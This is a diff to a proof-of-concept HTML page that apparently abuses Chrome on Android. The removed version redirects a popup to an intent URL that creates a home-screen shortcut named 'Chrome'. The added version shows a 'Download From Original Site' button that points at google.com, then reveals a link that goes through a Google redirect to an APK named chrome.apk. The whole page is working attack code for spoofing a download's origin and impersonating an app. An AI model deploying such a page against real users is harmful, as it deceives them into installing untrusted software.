@@ -4,7 +4,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chrome Android Intent PoC</title>
+  <title>Chrome Android Intent and Download PoC</title>
+
   <style>
     .button {
       background-color: #4CAF50;
@@ -12,50 +13,57 @@
       color: white;
       padding: 15px 32px;
       text-align: center;
+      text-decoration: none;
+      display: inline-block;
       font-size: 16px;
       margin: 4px 2px;
       cursor: pointer;
+      border-radius: 4px;
+    }
+
+    #downloadArea {
+      display: none;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
+<center>
+  <a href="https://google.com"
+     id="intentLink"
+     class="button">
+    Download From Original Site
+  </a>
+
+  <div id="downloadArea">
+    <p>APK destination is ready.</p>
+    <a
+      class="button"
+      href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"
+      target="_blank"
+      rel="noopener">
+      Continue to APK
+    </a>
+  </div>
+</center>
+
 <script>
-const intentUrl =
-  "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+const link = document.getElementById("intentLink");
+let triggered = false;
 
-let openedWindow = null;
+link.addEventListener("contextmenu", () => {
+  if (triggered) return;
+  triggered = true;
 
-function openTestWindow() {
-  openedWindow = window.open("https://google.com", "x");
-
-  if (!openedWindow) {
-    alert("Popup blocked");
-    return;
-  }
+  const newWindow = window.open("https://google.com", "x");
 
   setTimeout(() => {
-    openedWindow.location.href = intentUrl;
+    document.getElementById("downloadArea").style.display = "block";
+    triggered = false;
   }, 5000);
-}
-
-function handleContextMenu(event) {
-  event.preventDefault();
-
-  openTestWindow();
-}
-
+});
 </script>
-
-<center>
-  <button
-    class="button"
-    id="testButton"
-    onclick="openTestWindow()"
-    oncontextmenu="handleContextMenu(event)">
-    Open Android Intent Test
-  </button>
-</center>
 
 </body>
 </html>
